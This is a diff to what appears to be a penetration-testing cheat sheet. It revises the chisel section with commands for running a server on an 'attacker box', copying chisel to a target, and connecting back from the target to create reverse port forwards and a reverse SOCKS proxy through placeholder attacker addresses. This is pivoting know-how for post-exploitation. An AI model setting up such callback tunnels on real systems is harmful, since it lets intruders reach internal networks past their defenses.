@@ -844,19 +844,27 @@ checksec file_name_here
 
 ## CHISEL
 ```bash
-# set up server
+# set up tunnel
+## set up server on attacker box
 chisel server -p listener_port_here
-
-# set up server + allow clients to open listening port on server
+## set up server + allow clients to open listening port on server
 chisel server -p listener_port_here --reverse
 
-# transfer chisel to victim
+## transfer chisel to target
 
-# connect back to attacker box as client (forward_port required)
+## connect back to attacker box as client (forward_port required)
 chisel client attacker_IP_here:listener_port_here listener_host-here:listener_port_here:target_forward_host_here:target_forward_port_here
-
-# connect back to attacker box as client (open up listening port on server)
+## connect back to attacker box as client (open up listening port on server)
 chisel client attacker_IP_here:listener_port_here R:listener_port_here:target_forward_host_here:target_forward_port_here
+
+# set up SOCKS proxy
+## set up server on attacker box
+chisel server -p listener_port_here --reverse
+
+## transfer chisel to target
+
+## set up client
+chisel client  attacker_IP_here:listener_port_here R:socks
 ```
 
 
